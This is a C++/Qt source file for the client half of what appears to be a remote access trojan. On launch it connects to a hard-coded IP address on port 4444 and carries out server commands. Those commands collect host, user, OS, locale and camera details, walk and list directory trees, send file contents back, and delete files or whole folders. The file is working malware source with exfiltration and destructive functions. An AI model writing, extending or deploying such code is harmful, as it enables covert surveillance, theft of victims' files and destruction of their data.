#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ClientStartup();
}



MainWindow::~MainWindow()
{
    delete ui;
}


void MainWindow::ClientStartup()
{
    socket = new QTcpSocket(this);

    QObject::connect(socket, &QTcpSocket::connected,this,[&](){
        qDebug() << "[+] Succesful connected to the server.";

        QObject::connect(socket,&QTcpSocket::readyRead,this,[&](){
            qDebug() << "[+] New message from the server.";

            QByteArray data = socket->readAll();

            if(data == "#getPcInformation")
            {
                QLocale currentLocale = QLocale::system();
                QString language = currentLocale.name().section('_', 0, 0);

                QString country = QLocale::territoryToString(currentLocale.territory());

                QString camAnsw;

                if (QMediaDevices::videoInputs().count() > 0)
                {
                    camAnsw = "Yes";
                }
                else
                {
                    camAnsw = "No";
                }

                QByteArray Data = "#getPcInformation:" + QSysInfo::machineHostName().toLatin1() + ":" + QDir::home().dirName().toLatin1() + ":" + "N/A" + ":" + QSysInfo::prettyProductName().toLatin1() + ":" + language.toLatin1() + ":" + country.toLatin1() + ":" + camAnsw.toLatin1();
                socket->write(Data);
            }

            if(data.startsWith("#getFileTree:"))
            {
                QString dataString = data.mid(13);
                QDir dir(dataString);
                QDirIterator iterator(dir.absolutePath(), QDirIterator::Subdirectories);
                while (iterator.hasNext()) {
                    QFile file(iterator.next());
                    SelectedPath.push_back(file.fileName() + "\n");
                }

                socket->write("#getFileTree:" + SelectedPath.toLatin1());
                socket->waitForBytesWritten();
                SelectedPath.clear();
            }
            if(data.startsWith("#getAllFolders:"))
            {
                QString buffer = data.mid(15);
                QString files;

                QDir dir(buffer);

                // Фильтруем только файлы и папки (без "." и "..")
                QStringList entries = dir.entryList(QDir::Files | QDir::Dirs | QDir::NoDotAndDotDot);

                for (const QString &entry : entries) {
                    files += entry + "\n";
                }

                // Отправляем данные на сервер
                socket->write("#getAllFolders:" + files.toLatin1());
                socket->waitForBytesWritten();

            }
            if(data.startsWith("#deleteFile:"))
            {
                QString deletePath = data.mid(12);
                QFile::remove(deletePath);
            }
            if(data.startsWith("#deleteDir:"))
            {
                QString deleteDir = data.mid(11);
                QDir dir(deleteDir);
                dir.removeRecursively();
            }
            if(data.startsWith("#createFile:"))
            {

            }
            if(data.startsWith("#copyFiles:"))
            {
                QString filePath = data.mid(11);
                QFile file(filePath);

                if (!file.open(QIODevice::ReadOnly)) {
                    qDebug() << "❌ Ошибка: не удалось открыть файл" << filePath;
                    return;
                }

                QByteArray fileData = file.readAll();
                file.close();

                QByteArray packet;
                QDataStream out(&packet, QIODevice::WriteOnly);
                out << QString("#copyFiles:") << QFileInfo(file).fileName() << fileData;

                socket->write(packet);
                socket->waitForBytesWritten();
            }
        });

        QObject::connect(socket,&QTcpSocket::disconnected,this,[&](){
            qDebug() << "[-] Disconnected from the server.";
            socket->disconnectFromHost();
            socket->deleteLater();
        });
    });

    socket->connectToHost("192.168.18.59",4444);
}

void MainWindow::on_pushButton_clicked()
{
    QByteArray dataForServer = "Hello Server!";
    socket->write(dataForServer);
}

